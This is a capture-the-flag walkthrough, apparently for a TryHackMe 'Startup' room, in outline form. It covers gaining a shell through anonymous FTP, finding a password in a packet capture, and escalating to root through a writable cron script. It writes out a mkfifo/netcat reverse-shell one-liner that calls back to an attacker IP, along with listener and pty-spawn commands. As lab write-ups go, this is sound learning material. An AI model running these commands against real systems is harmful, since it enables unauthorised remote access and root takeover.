- # EXPLOITATION
	- `http://startup/files/` -> Among Us meme in the big 2k25 ðŸ¥€
		- ```Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
	- Ok, let's login into anonymous FTP and try to put a reverse shell in `/ftp` directory (we have the permissions). Obviously, we need to listen on our machine (`nc -lvnp 4444`)
		- Nice, now we have a reverse shell!
			- `/recipe.txt`: `Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.`

- # PRIVILEGE ESCALATION
	- There's a pcapng file: `/incidents/suspicious.pcapng`, let's put it into `/var/www/html/files/ftp/`.
		- There's Lennie's password: `c4ntg3t3n0ughsp1c3`
	- Spawn a `/bin/bash` shell (`python -c "import pty; pty.spawn('/bin/bash')")
	- There's an hidden cronjob (discovered thanks to `pspy`) that is runned every minute: `/etc/print.sh`
		- `2025/08/19 11:32:01 CMD: UID=0     PID=27365  | /bin/bash /etc/print.sh`
			- We can also see some scripts in the `/home/lennie/script` folder and another one in `/etc/print.sh`. Let's modify the last one (since we have the write permissions, 'cause the owner is Lennie): `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.1.212 8888 >/tmp/f` -> `nc -lnvp 8888`
				- Let's wait a minute and...
					- We're ROOT!
